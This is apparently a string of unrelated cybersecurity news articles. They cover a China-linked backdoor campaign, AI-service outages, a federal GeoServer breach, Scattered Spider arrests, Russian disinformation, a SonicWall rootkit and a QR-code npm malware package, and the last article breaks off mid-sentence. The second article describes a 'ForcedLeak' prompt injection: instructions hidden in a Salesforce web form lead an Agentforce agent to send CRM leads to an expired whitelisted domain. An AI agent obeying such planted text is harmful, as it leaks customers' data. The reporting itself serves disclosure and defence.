A China-linked cyber-espionage group is systematically exploiting network and infrastructure appliances that lack standard endpoint detection and response (EDR) support to break into organizations across sectors such as legal services, technology, software-as-a-service (SaaS) providers, and business process outsourcing.The attackers have been deploying a sophisticated backdoor that Google’s Threat Intelligence Group (GTIG) is tracking as ""Brickstorm"" to enable long-term access that, according to researchers, spanned well over a year.Stealthy TradecraftBrickstorm hides by mimicking legitimate software and using unique command-and-control (C2) servers for each victim, making detection and blocking extremely difficult. The campaign's stealthy tradecraft has allowed the threat actor, tracked as UNC5221, to persist inside compromised networks for an average of 393 days before being detected, according to GTIG.In many cases, Google found UNC5221 quietly accessing the emails of developers, administrators, and individuals of likely strategic interest to China by abusing Microsoft Entra ID enterprise applications with elevated permissions. What makes the campaign especially concerning is UNC5221's targeting of organizations whose systems often provide access to downstream customers. ""We have observed SaaS provider compromise leading to downstream access to their customers,"" says Austin Larsen, principal analyst with GTIG.Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak Site""We're not sharing victim numbers or additional details on the specific victims but want to highlight that UNC5221 is targeting enterprise companies, BPOs, and tech products that governments and other tech companies use,"" Larsen says.As is often the case with sophisticated state-backed campaigns, GTIG researchers have not been able to definitively nail down how UNC5221 is gaining initial access to target network appliances, most of which are ether Linux or BSD-based systems. But available telemetry points to the attacker exploiting both previously known vulnerabilities as well as zero-day flaws to get a foothold on perimeter and remote access devices from multiple manufacturers. Target appliances include firewalls, VPNs, IDS/IPS, and other devices that organizations deploy at the network edge. Typically, these systems are locked down by design, meaning defenders cannot deploy standard endpoint detection and remediation tools on them, which essentially creates blind spots for attackers to exploit.""While BRICKSTORM has been found on many appliance types, UNC5221 consistently targets VMware vCenter and ESXi hosts,"" GTIG researchers noted in the blog post. ""In multiple cases, the threat actor deployed BRICKSTORM to a network appliance prior to pivoting to VMware systems.""Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageA Cross Platform ThreatBrickstorm itself is a cross-platform backdoor written in Go. The malware supports SOCKS proxy functionality, essentially turning an infected device into a relay point that allows the attackers to route their traffic through it and pivot deeper into the network while obscuring their true origin. The samples of Brickstorm that UNC5221 is using in the latest campaign are improvements on the samples that Google had previously analyzed. One of the most significant improvements is the introduction of a ""delay"" timer in some Brickstorm samples that ensures the malware lies dormant on an infected system until a hard-coded date several months later. GTIG also found the threat actor using Garble, an open source tool for code obfuscation, to hide function names, structures and logic on some newer Brickstorm samples. Some included a new version of a custom library, suggesting UNC5221 is developing the malware on a continuing basis.Brickstorm, according to GTIG, is designed to hide in plain sight on the devices it infects with names and functions that masquerade as legitimate activity. The malware uses C2 servers that run through popular cloud services like Cloudflare Workers or Heroku or use dynamic domains like sslip.io or nip.io that point directly to the C2 server’s IP. Significantly, each victim gets their own C2 domains making it harder for defenders to track and block them.Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessPicus Security, another cybersecurity vendor that has been tracking Brickstorm-related activity, describes the malware as allowing UNC5221 actors to ""tunnel into internal networks for interactive access and file retrieval."" The malware accepts web-based commands, executes them on the host and returns output via HTTP responses, according to the vendor.Long-Term StealthHüseyin Can Yüceel, security research lead at Picus, says the threat group follows a low-noise playbook. ""[It] favors appliance and management-plane compromise, per-victim obfuscated Go binaries, delayed-start implants, and Web/DoH C2 to preserve stealth,"" Yüceel says. ""The group's long-term stealth is deliberate.""The group's TTPs typically include harvesting and using valid high-privilege credentials so their activity appears as routine administrator tasks. They also deploy in-memory servlet filters, remove installer artifacts, and embed delayed-start logic to limit forensic traces, Yüceel says. Other UNC5221 tactics that organizations should watch for include abuse of virtualization management capabilities, such as cloning VMs to extract credential stores offline; deployment of an in-memory Java Servlet filter on vCenter that intercepts and decodes web authentication to harvest high-privilege credentials; and the use of a SOCKS proxy on compromised appliances, he advised.Shane Barney, chief information security officer (CISO) at Keeper Security, says the Brickstorm campaign highlights how attackers are shifting toward systems that often fall outside traditional monitoring, like edge devices and virtualization platforms. ""When adversaries can persist for over a year undetected, it underscores the importance of visibility and disciplined risk management across the entire infrastructure,"" Barney says.For security leaders, the focus should be on treating these appliances as critical assets, Barney says. That means maintaining a current inventory, limiting unnecessary internet access, and ensuring logs flow into centralized monitoring. ""While perfect prevention isn't realistic, improving detection on these blind spots can significantly reduce dwell time and strengthen resilience against long-term espionage campaigns,"" Barney says.The Brickstorm malware campaign is a reminder of how security infrastructure itself is a often prime target for advanced nation-state actors, adds Craig Jones, chief security officer (CSO) at Ontinue. ""The fact that these intrusions can persist undetected for months speaks to both the patience of the actors and the gaps that still exist in traditional detection models"" he says. ""It is a reminder that defending against sophisticated actors is not only about patching your own systems, it's about holding partners, suppliers, and core security infrastructure to the same standard of vigilance."""

Salesforce Web forms can be manipulated by the company's ""Agentforce"" autonomous agent into exfiltrating customer relationship management (CRM) data — a concerning development as legacy software-as-a-service (SaaS) providers race to integrate agentic AI into their platforms to zhuzh up the user experience and generate buzz among investors.Agentforce is an agentic AI platform built into the Salesforce ecosystem, which allows users to spin up autonomous agents for most conceivable tasks. As the story often goes though, the autonomous technology appears to be the victim of the complexity of AI prompt training, according to researchers at Noma Security. To wit: The researchers have identified a critical vulnerability chain in Agentforce, carrying a 9.4 out of 10 score on the CVSS vulnerability-severity scale. In essence it's a cross-site scripting (XSS) play for the AI era — an attacker plants a malicious prompt into an online form, and when an agent later processes it, it leaks internal data. In keeping with all of the other prompt injection proofs-of-concept (PoCs) coming out these days, Noma has named its trick ""ForcedLeak.""To mitigate the risk, users should add any additional external URLs that users rely on to the Salesforce Trusted URLs list or to their AI agent's instructions. This includes things like external feedback forms (like forms.google.com), external knowledge bases, or any third-party websites your agents need to link to, according to Salesforce.Related:'Trifecta' of Google Gemini Flaws Turn AI Into Attack VehicleHow to Manipulate Salesforce AI AgentsSay you'd like to demo a company's product. You might request to do so using a Salesforce ""Web-to-Lead"" form. You enter your name, your company's name, and your email address on the vendor's site, and then there's a ""Description"" field if you feel like elaborating on the matter. Submit, and it goes straight to their CRM system.It's the exact kind of place where, in years past, attackers might have chosen to inject malicious code. Mainstream websites are wise to fall for code injection nowadays, but what about prompt injection?Well, it depends on ""context boundaries"" — whether AI designed for specific business applications would also respond to any other kind of prompt, randomly off the street. To find out in this case, Noma researchers tested Agentforce by asking Salesforce's proprietary AI model simply, ""What color do you get by mixing red and yellow?"" Its response: ""Orange."" This demonstrated that the AI would entertain matters beyond the bounds of standard sales interactions.Related:Iranian State Hackers Use SSL.com Certificates to Sign MalwareKnowing this, an attacker could embed a prompt in a Web-to-Lead form. If an employee on the other end of the line uses an AI agent to handle that form — for example, one whose job is to ingest leads and email routine responses to the original sender — the agent will also process any malicious instructions.Of course, there are some limits on what an agent will do. An Agentforce robot is smart enough not to exfiltrate sensitive CRM data to your own personal Web domain, for example.But, the researchers found a way around this, too, when they realized that Salesforce's Content Security Policy whitelisted a number of trusted domains, including the expired ""my-salesforce-cms.com."" So in their malicious prompt, they requested that a list of internal customer leads and their email addresses be sent to that domain, which in a real attack scenario a hacker could have purchased.""And that's basically the game over,"" says Noma chief technology officer (CTO) and co-founder Alon Tron. ""We were able to compromise the agent and tell it to do whatever. It could leak information, as we asked. But it could also be asked to change the information in the CRM, delete databases, whatever."" An attacker could also theoretically use an Agentforce agent to pivot to other corporate systems.Related:Cisco's Wave of Actively Exploited Zero-Day Bugs Targets Firewalls, IOSAgentforce Data Leak ScenariosInternal communications, insights into business strategy, and a wealth of specific information about employees and customers could all be up for grabs with such an attack, researchers warned. Potentially even worse, ""users of CRM tools can track all kinds of data in notes and custom fields. Notes could include personal details about a customer, like age, hobbies, birthdays, and family status. Often, companies also track interactions with a customer including day and time of calls, where meetings took place, details about the conversation, and now with automated tools, the entire chat transcript. Finally, CRMs are often used to track transaction information including but not limited to purchase history, order value, and payment information.""What's more, ""once they have sales data, attackers know who is expecting what and when and from whom it is probably going to come from,"" notes Andy Bennett, chief information security officer (CISO) for Apollo Information Systems. That means ""any and all of this sales information can be used to customize and target social engineering attacks of every type. In short, sales data can be some of the best data for the attackers to use to select and effectively target their victims.""To address ForcedLeak, Salesforce honed in on the data exfiltration aspect of the attack chain, scooping up that expired domain and more generally enforcing stricter rules around trusted URLs. Structural fixes to how its AI processes instructions however remain elusive for now, according to Noma. ""It's a complicated problem, defining and getting the AI to understand what's malicious or not in a prompt,"" Tron explains. He adds, optimistically, that ""Salesforce is working to actually solve the root cause, and provide more robust ways of prompt filtering. We expect them to create more robust layers of defense for their models and the agents themselves.""For its part, a Salesforce spokesperson gave Dark Reading the following statement: ""Salesforce is aware of the vulnerability reported by Noma and has released patches that prevent output in Agentforce agents from being sent to untrusted URLs. The security landscape for prompt injection remains a complex and evolving area, and we continue to invest in strong security controls and work closely with the research community to help protect our customers as these types of issues surface."""

How serious is the threat — and what can companies do?
As developers and DevOps teams increasingly rely on a variety of cloud-based services — from DevOp pipelines to code-generating artificial intelligence (AI) models — the teams face the increasing possibility that outages will cause disruptions to applications. And experts believe a major incident is due.To some degree, these problems have already had an impact, albeit on a minor scale. On Sept. 10, for example, Anthropic's Claude.ai and Console services and the associated API suffered a systemwide outage that lasted about 30 minutes, causing users to joke that ""'LLM down' is the new 'it's compiling'"" and about being forced to code like ""a caveman."" In July, development platform GitHub reported ""degraded performance across multiple services including API, Issues, GraphQL and Pull Requests,"" which led to about 4% of requests failing.Such performance hits — rather than full-blown outages — are typical, impacting only a subset of users or services, says Jakub Olesky, senior vice president of engineering for GitHub.""We are deeply committed to efforts ensuring we can gracefully handle disruption and minimize downtime,"" he says. ""That means prioritizing investments in scale, safe deployments, and resilience, with committed timelines on improvements from every incident.""Related:UltraViolet Expands AppSec Capabilities With Black Duck's Testing BusinessYet some industry experts argue that it's only a matter of time before a major incident results in hours to days of downtime for developers. In some ways, the Shai-Hulud worm caused such an outage — the pollution of the node package manager (npm) ecosystem by the worm resulted in the compromise of 500-plus packages and a massive clean-up effort that stalled many developers.With application teams increasingly dependent on common infrastructure, the outages and incidents underscore that any problem with a critical cloud service could have a ripple effect, says Daria Kulikova, a cybersecurity strategist for GitProtect.io, which provides backup and resilience services.Software teams increasingly depend on cloud-based tools, including source code hosting services like GitHub, continuous integration/continuous deployment (CI/CD) pipelines, integrated development environments (IDEs), and AI-assisted coding platforms, says Kulikova. This creates a systemic single point of failure in modern software development, she explains.""Even minor cloud outages or slowdowns can cascade across multiple teams and projects, halting development pipelines, blocking code reviews, and delaying releases,"" Kulikova says.DevOps Services Mostly ReliableRelated:Do Claude Code Security Reviews Pass the Vibe Check?Overall, development or deployment services are very reliable. In a discussion of how developers should prepare for potential outages of Microsoft's Azure DevOps (ADO), many commenters pointed out that the service has rarely had significant issues.""Pretty sure ADO's uptime has handily beat any of our on-prem services,"" one poster stated.So far, DevOps services' outages have been mostly minor, failing to have a serious impact on software development. The average outage lasted less than two hours (106 minutes), according to information service provider IsDown's ""2024 Outage Report.""Still, in the first half of 2025, DevOps platforms suffered a total of 330 incidents, according to data collected by GitProtect.ai. Azure DevOps, which has more than 1 billion users, suffered 74 incidents during the first six months of the year, including one of the longest performance degradations reported, lasting 159 hours. GitHub incidents rose 58% year over year in the first half; out of 109 reported cases, 17 were ranked as major, totaling over 100 hours of disruption, according to the report.GitLab patched fewer vulnerabilities in the first half than the previous year but still faced 59 incidents, with a total 1,346 hours of disruption. The platform has a 99.8% uptime service-level objective, which it has exceeded in the last three months, says Sabrina Farmer, chief technology officer at GitLab.Related:Minimal, Hardened & Updated Daily: The New Standard for Secure Containers""GitLab has not had a significant sitewide outage in the past five years,"" she says. ""Our most significant outage was a 2017 database incident caused by human error during maintenance. We have since implemented multiple safeguards to prevent similar incidents.""More Resiliency For Development""In advance, people should know what to expect, how to respond, and what their roles are,” she says. ""Resilience comes from combining technological flexibility with disciplined operational practices.""DevOps teams should bake resilience into their workflows. GitHub's Olesky points out ways for developers and development teams to build resilience to outages, such as using local-first workflows, designing fallbacks and failovers into their CI/CD pipelines, and caching dependencies.GitLab's Farmer says that the increasing reliance on AI coding assistants, CI/CD services, and testing platforms makes planning for outages even more important for development teams.""Teams that rely on a single vendor or fail to implement graceful degradations are putting their productivity and, in some cases, their users’ experience at risk,"" she says. ""AI, in particular, will likely experience previously solved incidents, and users are still testing the boundaries of the technology and the new infrastructure that many providers are only just now deploying at scale.""During the recent Anthropic outage, one individual recognized the benefits of having on-site redundancies for AI inference systems, posting on an online board: ""Glad we have an internal load balancing/failover LLM inference system, so this outage won't take prod down for us.""Development teams should focus on making workflows resilient, adding redundancies where appropriate, having backups of important data, and having alternative test-and-build environments that can be quickly activated, says GitProtect's Kulikova. She recommended stress-testing these failover strategies, simulating outages to uncover hidden dependencies or bottlenecks that could halt development in a real incident.""In advance, people should know what to expect, how to respond, and what their roles are,” she says. “Resilience comes from combining technological flexibility with disciplined operational practices."""

The Cybersecurity and Infrastructure Security Agency (CISA) this week disclosed that threat actors breached a federal agency last year by exploiting a critical vulnerability in the open source GeoServer mapping server.In the advisory, CISA said it conducted incident response at a large, unnamed federal civilian executive branch (FCEB) agency after malicious activity was flagged by the agency's endpoint detection and response (EDR) platform, but found the agency's response playbook to be lacking; so lacking in fact that it hampered CISA's investigation and allowed the attackers to burrow deeper into the network unchecked.""CISA discovered that cyber threat actors compromised the agency by exploiting CVE-2024-36401 in a GeoServer about three weeks prior to the EDR alerts,"" the advisory said. ""Over that three-week period, the cyber threat actors gained separate initial access to a second GeoServer via the same vulnerability, and moved laterally to two other servers.""GeoServer is used to collate geospatial data from disparate sources for mapping purposes; its users include members of the Open Geospatial Consortium, who are in the business of tracking weather, performing geographical surveys, linking environmental data to aerospace or military endeavors, and more. The critical vulnerability, which allows remote code execution (RCE), was initially disclosed on June 30 last year and received a 9.8 CVSS score. CISA said the threat actors initially gained access to the FCEB agency's network on July 11, 2024 — less than two weeks after the disclosure.Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteCISA added CVE-2024-36401 to its Known Exploited Vulnerabilities (KEV) catalog on July 15, 2024. It's unclear if the FCEB agency compromise is what prompted CISA to add the flaw to the KEV catalog. A CISA spokesperson tells Dark Reading, ""CISA does not publicly disclose the specific exploitation activity used to determine which vulnerabilities are added to the KEV catalog.""Anatomy of a Federal Agency BreachAccording to CISA's advisory, the attackers discovered the vulnerable GeoServer instances at the FCEB agency by conducting network scanning with Burp Suite, a well-known penetration testing suite. The attackers then exploited the vulnerability soon after its disclosure to gain access to a public-facing GeoServer instance, and downloaded open source scripts and tools, which they used along with living-off-the-land techniques to move laterally through the network.On July 24, 2024, the attackers exploited CVE-2024-36401 again to gain access to a second GeoServer instance at the FCEB agency. The threat actors then pivoted from the first GeoServer instance to a Web server and SQL server, where they dropped Web shells, including the widely used China Chopper.Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageWhile China Chopper has been associated with China-nexus threat groups in high-profile campaigns such as the ProxyLogon attacks against Microsoft Exchange servers in 2021, it is not exclusive to such groups.Once the threat actors established persistence in the FCEB agency network, they obtained account passwords primarily through brute force attacks, CISA said. The threat actors also attempted to use an exploit for CVE-2016-5195, a Linux flaw known as ""Dirty Cow"" that can be used to escalate privileges, and used Stowaway, a publicly available network proxy tool, for command-and-control (C2) traffic.The bug proved to be a popular target: In a blog post published in September 2024, Fortinet researchers said they observed ""multiple campaigns"" exploiting CVE-2024-36401 following the addition of the flaw to the KEV catalog, including activity related to botnets and cryptocurrency miners. Trend Micro also published research that month tying exploitation of the vulnerability to a China-linked cyber espionage group it tracks as ""Earth Baxia."" Trend Micro researchers observed Earth Baxia exploiting the GeoServer flaw to breach the networks of Taiwanese government agencies as well as the Philippine and Japanese military. CISA did not attribute the US agency attack to a specific group, however.Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessGlaring Cybersecurity Shortcomings at a US AgencyIn its advisory, CISA shared lessons from the FCEB agency's breach as well as takeaways regarding the organization's security posture — and the results aren't pretty. First, CISA highlighted that agency did not promptly remediate CVE-2024-36401, even after the flaw was added to the KEV catalog, which allowed the threat actors to compromise the second GeoServer instance on July 24.""July 24, 2024, was within the KEV-required patching window for this CVE,"" the advisory said. ""However, CISA encourages FCEB agencies and critical infrastructure organizations to address KEV catalog vulnerabilities immediately as part of their vulnerability management plan.""CISA also noted that the agency's incident response plan was not properly tested, nor was it designed to promptly engage third parties and provide them access to the necessary resources for incident response. Specifically, the agency could not grant CISA personnel remote access to its SIEM, ""which hampered CISA's efforts to respond to the incident quickly and efficiently.""And lastly, the advisory said the FCEB agency did not continuously review EDR alerts, and noted that some public-facing resources, including the compromised Web server, lacked any endpoint protection at all.""The activity remained undetected for three weeks; the agency missed an opportunity to detect this activity on July 15, 2024, as they did not observe an alert from GeoServer 1 where the EDR detected the Stowaway tool,"" the advisory said.As for lessons learned, CISA urges organizations to establish a vulnerability management plan with processes for the prioritization and prompt patching of exploited vulnerabilities; maintain, update and test incident response plans; and implement comprehensive and detailed logging."

Teen Member Surrenders Amid Group's Shutdown Claims,"The cybercrime group continues to gain attention despite its apparent shutdown last week.
A member of notorious cybercrime group Scattered Spider has turned himself over to the authorities at Clark County Juvenile Detention Center in Las Vegas, marking the latest ""win"" for law enforcement against the band of youthful hackers.The news comes on the heels of the group announcing — perhaps disingenuously — that it was closing its cybercrime operations down. The latest suspect was first identified by the Federal Bureau of Investigation’s Las Vegas Cyber Task Force as a teenage male, and he has since been booked for several charges including: three counts of obtaining and using the personally identifiable information (PII) of another person to either harm or impersonate them, one count of extortion, one count of conspiracy to commit extortion, and one count of unlawful acts regarding computers. It's unclear which specific attacks the charges refer to.""The Clark County District Attorney's Office is seeking to transfer the juvenile to the criminal division, where he would face these charges as an adult,"" according to the Las Vegas Metropolitan Police Department, via press release.Meanwhile, two other suspected members of the gang — Thalha Jubair, 19, from East London, and Owen Flowers, 18, from Walsall — were arrested and charged in the UK last Tuesday after an investigation into the hack of Transport for London (TfL) last year.Related:For One NFL Team, Tackling Cyber Threats Is Basic DefenseAs mentioned, the detainments come after the group, along with cyberthreats Lapsus$ and Shiny Hunters, announced they were shutting down their operations. The announcement was posted in a farewell letter on hacking marketplace BreachForums, and on the ""Scattered Lapsus$ Hunters"" public Telegram channel. Some of the members, according to the letter, were planning on retiring while others planned on staying in the field of cybersecurity in more ""positive"" roles. Still, some security researchers remain skeptical of the news, pointing to evidence of continued activity.  Scattered Spider's Cybercrime Arrests Pile UpThe group is known for being comprised of primarily English-speaking teenagers and twenty-somethings who carry out hacking rampages using social engineering tactics, targeting ""Big Fish,"" and compromising notable victims. Increasingly, law enforcement in both the United States and Europe are tightening the net on members. Scattered Spider first gained notoriety after high-profile breaches and ransomware attacks in 2023 on Las Vegas casino and hotel giants Caesars Entertainment and MGM Resorts. At that point, reports showed that federal law enforcement was well aware of the identities of the members of the cybercrime group but had yet to make any arrests. In November of that year, the FBI and CISA released an advisory on the group providing details on how enterprises could defend their networks.Related:China Imposes One-Hour Reporting Rule for Major Cyber IncidentsA year later, in November 2024, the Department of justice unsealed criminal charges against five members of the group. Four of the defendants were American, ranging from 20- to 25-years-old, while the fifth member, Tyler Robert Buchanan, 22, was located in the United Kingdom. The eldest of them, Joel Martin Evans, aka ""joeleoli,"" of Jacksonville, NC, made his first appearance in court soon after being arrested by the FBI. The maximum sentence for their crimes is 20 years in federal prison for conspiracy to commit wire fraud, up to five years for conspiracy, two years for aggravated identity theft, and 20 years for wire fraud.The FBI once again managed to catch a criminal in its web when it arrested 19-year-old Remington Goy Ogletree in December 2024. Ogletree was accused of running a phishing operation from October 2023 to May 2024 after he was able to gain credentials and unauthorized access to two telecommunications companies and one US-based national bank. Allegedly, he stole data such as API keys and cryptocurrency before selling it off to the highest bidder on the Dark Web.Related:Prep is Underway, But 2026 FIFA World Cup Poses Significant Cyber ChallengesThe arrests have continued from there. This April, Noah Urban, a 20-year-old linked to the notorious group, pled guilty to his cybercrime charges and agreed to pay millions in restitution. Also known as ""King Bob,"" he was arrested with four other members and initially pled not guilty before eventually accepting a plea deal after charges in California and Florida were brought against him.And in June, the alleged ringleader of the cybercrime group was arrested in the Palma Airport in Palma de Mallorca as he was trying to board a flight to Italy. At the time of the arrest, the 22-year-old possessed a laptop, a mobile phone, and was in control of $27 million in bitcoin. According to reports, he was accused of more than 45 cyberattacks against US companies. No Rest for Scattered Spider's Cybercrime Activity?Despite the many arrests, the group has remained steadfast in continuing its attacks against enterprises. When Marks & Spencer was attacked earlier this year, researchers reported that the attack was perpetrated by members of Scattered Spider using DragonForce ransomware. Other retail targets followed, including Harrods and Co-Op.Four people were arrested in the UK as a result of the retailer attacks, including two 19-year-old men, a 17-year-old man, and a 20-year-old woman — all believed to be affiliated with the group and held on suspicion of blackmail, money laundering, participating in organized crime, and more.  And just months ago, the FBI took to warning organizations that Scattered Spider actors were deploying their social engineering tactics against airline companies and their third-party IT providers, meaning that anyone in the airline ecosystem could be at risk. Though the FBI didn't mention any victims by name, both Hawaiian Airlines and Canada's WestJet reported experiencing cybersecurity incidents that disrupted some of their operations.Despite the group's claim to have gone dark, it remains unclear what the future will hold for its members. In its farewell letter the group stated: ""Will Kering, Air France, American Airlines, British Airlines, and among many other critical infrastructure face THE CONSEQUENCES OF THEIR PUBLIC OR SECRET data breaches? I'd wonder too if I was them, as they know some have yet to receive any demand for ransom — or anything else. Are their data currently being exploited, whilst US, UK, AU, and French authorities fill themselves with the illusions thinking they have gotten the situation under control?"" Some believe this indicates that the doors to Scattered Spider's operations may not be fully shut, or that the fallout from its attacks may still be underway.""Cybercrime groups have bit of a history when it comes to retiring, that is often no more than the equivalent of lying low while the heat is on,"" says James Maude, field chief technology officer (CTO) at BeyondTrust. ""Anyone believing their retirement claims shouldn't get complacent about the need to better secure identities and paths to privilege, as there is a small army of threat actors ready and waiting to exploit those. Even if some members of the group are retiring, spending their days cashing out ill-gotten cryptocurrency in the Caribbean, the amount of money available to be made from cybercrime will ensure that any void is quickly filled.""Thus, enterprises need to remain vigilant, focus on resilience, and expect that these threat actors, or whoever replaces them, will continue to evolve, he warns."

A state-backed Russian threat actor is targeting the 2025 Moldovan elections with a far-reaching disinformation campaign, and the threat actor behind it has older ties to Moscow.Threat hunting vendor Silent Push published research on Sept. 23 concerning a threat actor tracked as Storm-1679 (aka Matryoshka). Silent Push's research builds upon a Recorded Future analysis published earlier this month, explaining how Russia has been using disinformation to disrupt Moldova's Sept. 28 parliamentary elections and thwart its efforts to join the European Union.This campaign generally takes the form of news sites that contain articles biased against current Moldovan leadership and Moldovan's potential entry into the EU, as well as false headlines about the current government.Connecting the Dots Between Moldova Disinfo & RussiaWhile Recorded Future's research was more focused on the political implications of the campaign, Silent Push researchers tracked it from a more technical perspective. For example, although the numerous websites acting as part of this campaign had no clear ownership, Silent Push identified a ""technical fingerprint"" connecting this latest campaign to Absatz, a Russian propaganda effort and media organization that began in 2022.Related:For One NFL Team, Tackling Cyber Threats Is Basic Defense""Absatz was registered on March 31, 2022, with the Russian media regulator Roskomnadzor. Also known as the Federal Service for Supervision of Communications, Information Technology, and Mass Media, Roskomnadzor is the Russian government’s primary regulator for media and the Internet,"" the researchers said. ""The regulator has been previously criticized for censoring independent media and enforcing state control.""Silent Push researchers identified commonalities in the code present between multiple disinformation websites, as well as domains linked to two dedicated IP addresses, suggesting ""infrastructure reuse and common ownership across this campaign.""These two IP addresses have been used for disinformation campaigns since at least 2022 and were linked to the aforementioned Absatz. And as the technical footprints were only found on 2022 and 2025 Russian disinformation websites, Silent Push concluded there were developer ties between the two campaigns.The blog post further cited that Absatz, according to its own website, is run by an individual named ""Shakhnazarov M. S.,"" likely referencing alleged propagandist Shakhnazarov Mikhail Sergeyevich, who is based in Russia and previously has been sanctioned by Ukraine for supporting the former's invasion of the latter.  Related:China Imposes One-Hour Reporting Rule for Major Cyber IncidentsDigging Deeper Into Russia's Disinformation CampaignsSilent Push, in the interest of operational security, decided not to publish the specific technical fingerprints publicly. Kasey Best, director of threat intelligence at Silent Push, tells Dark Reading that part of the reason came down to the technical indicators being ""obscure enough to be reused by those behind this or other networks again in the future.""Dark Reading asked Best, if Russia is engaging in a kind of threat activity as it is, why wouldn't they go further? Why wouldn't Russia lace its websites with infostealers or other malicious trackers?""Many reasons,"" he says, such as the unwanted attention malware would bring from the larger security community. The presence of malware would also remove barriers preventing legal frameworks from disrupting disinformation sites, while placing additional pressure onto hosting providers to take action.""In the world of psychological operations, the longer a given influence campaign goes without detection the more valuable it is, so while that does not guarantee benign networks will always be used by any means — there are other factors to consider,"" Best explains. ""This makes the inclusion of infostealers and the like very much a risk/reward judgement from an operator's perspective.""Related:Prep is Underway, But 2026 FIFA World Cup Poses Significant Cyber Challenges"

SonicWall has released a firmware update to aid its customers in removing a rootkit malware, a type of malware designed to allow threat actors admin-level access while remaining undetected.The malware targets SonicWall Secure Mobile Access (SMA) 100 series products such as SMA 210, 410, and 500v. SMA corporate appliances are unified secure access gateways for providing access to on-prem, cloud-based and hybrid data-center-hosted applications from remote devices, including managed and unmanaged.Should users apply the new firmware update, they will be provided with additional file checking, ""providing the capability to remove known rootkit malware present on the SMA devices,"" according a SonicWall advisory released yesterday.SonicWall strongly recommends users upgrade to the 10.2.2.2-92sv version for the safeguards, especially as the SonicWall SMA 100 devices reach end-of-support on Oct. 1.The advisory was released to help customers affected in the MySonicWall cloud backup file incident after SonicWall's investigation into the matter last week found that a malicious actor was using brute-force techniques against the MySonicWall.com Web portal to gain access to customer information.UNC6148 Cyberthreat Group Gains Persistent AccessMeanwhile, a campaign exploiting SonicWall’s SMA has been ongoing, according to researchers at Google Threat Intelligence Group (GTIG) in a July report of the threat. The attacks are at the hands of a threat actor tracked as UNC6148, which has likely been leveraging credentials and one-time password seeds stolen during previous breaches. Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteNow, the threat actor is deploying what the researchers describe as a ""previously unknown persistent backdoor/user-mode rootkit"" which they are tracking as OVERSTEP.""Our analysis shows this malware modifies the appliance's boot process to maintain persistent access, steal sensitive credentials, and conceal its own components,"" said the researchers, as well as allowing attackers to remove log entries to evade detection and hide files and activity. They added that in the recent spate of attacks, ""UNC6148 may have used an unknown zero-day remote code execution vulnerability to deploy OVERSTEP on opportunistically targeted SonicWall SMA appliances.""Google TAG researchers noted that there are several vulnerabilities that could have been exploited by UNC6148 in the past, including CVE-2021-20038, a memory corruption vulnerability; CVE-2024-38475, an unauthenticated path traversal vulnerability; CVE-2021-20035 and CVE-2021-20039, authenticated remote code execution vulnerabilities; and CVE-2025-32819, an authenticated file deletion vulnerability.  Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageSonicWall researchers noted that users will know if they are compromised if there are gaps or deletions in SMA logs, unexpected reboot of the appliance, persistent or unexplained admin sessions, configuration changes made without user authorization, or reoccurring access following patching or resets.If any of the signs are present, the Cybersecurity and Infrastructure Security Agency (CISA) and the researchers recommend that users upgrade their firmware immediately, replace and rebuild SMA 500v, reset one-time password (OTP) bindings for all users, and apply hardening measures such as enforcing multifactor authentication (MFA) for all users, resetting all passwords, and replacing certificates with private keys stored on the appliance."

Attackers have poisoned a code package on the npm registry in a novel way, hiding credential-stealing malware in steganographic QR codes embedded in a package purporting to offer a JavaScript utility.Researchers from Socket Threat Research discovered the malicious package, called ""fezbox,"" on the npm website earlier this week and petitioned for its removal as well as the suspension of the user who posted it, according to a blog post published this week. The package is supposed to be a ""JavaScript/TypeScript utility library of common helper functions, organized by feature modules so you can import only what you need,"" according to is description, posted by a Chinese-speaking attacker with the online alias ""janedu.""Instead, the package hides a payload that it executes from within a QR code that could steal username and password credentials from Web cookies within the browser. It also included other layers of obsfucation, demonstrating ""how threat actors continue to improve their obfuscation techniques,"" noted Socket Threat Research's Olivia Brown in the post.At the time the Socket Threat Research post was published, the package was still active; it has since been removed and flagged as malware posing a supply chain risk. It's unclear whether the attacker is still active on the npm registry however, and those who previously downloaded the package could still be at risk.Related:Microsoft's Voice Clone Becomes Scary & UnsalvageablePoisoned Npm Package: Advanced Obfuscation, Simple FunctionalityPoisoned npm packages are becoming an unfortunately typical occurrence these days as a way attackers can spread malware rapidly and widely through the software supply chain. However, as a malicious package itself, fezbox likely wouldn't have been so successful, as ""most applications no longer store literal passwords in cookies,"" Brown noted.However, the advanced malware obsfuscation method the package uses is what makes it noteworthy to security researchers, since it demonstrates how attackers are upping the ante for how they hide malicious code in legitimate-looking packages, one security expert noted.""Threat actors have traditionally exploited QR codes by directing victims to credential-phishing Web pages,"" observes Chance Caldwell, senior director of the Phishing Defense Center at Cofense. ""This new attack, however, demonstrates a far more advanced technique: embedding obfuscated malicious code directly within the QR code itself.""Moreover, attackers designed the code ""so that only the malicious payload can properly interpret it, effectively concealing it from traditional static security measures,"" he added.Related:Red Hat Investigates Widespread Breach of Private GitLab RepositoriesQR Codes as Malware-Delivery OptionQR codes are actually not such an unusual way to hide malware, as they are expected to have payloads inside the code that typically take someone to another destination, usually a website, Brown observed.""Steganography is the practice of hiding a secret file in plain sight, something for which QR codes are great,"" she wrote in the post. ""Using a QR code as a steganographic obfuscation technique is quite clever and shows yet again that threat actors will continue to use any and all tools at their disposal.""Moreover, the ReadMe of the fezbox npm package did allude to a QR Code Module included in the package that can generate and parse QR codes and auto-load dependencies, making its existence seem legitimate. ""However, it does not state that importing the library will fetch a QR code from a remote URL and execute the code contained in that QR,"" Brown said.When trying to deconstruct the code, the Socket Threat Research team found several layers of obsfuscation — reversed string, the QR code itself, and an obfuscated payload — before they could examine the payload code itself.""Reversing strings is a classic anti-analysis stealth trick,"" Brown noted. ""When performing static analysis, it's possible that certain tools would not pick up on the reversed version of password or a reversed URL.""Related:Sneaky, Malicious MCP Server Exfiltrates Secrets via BCCOnce the code was analyzed, the researchers found that the payload could read a Web cookie and extract the username and password. ""If there is both a username and password in the stolen cookie, it sends the information via an HTTPS POST request,"" 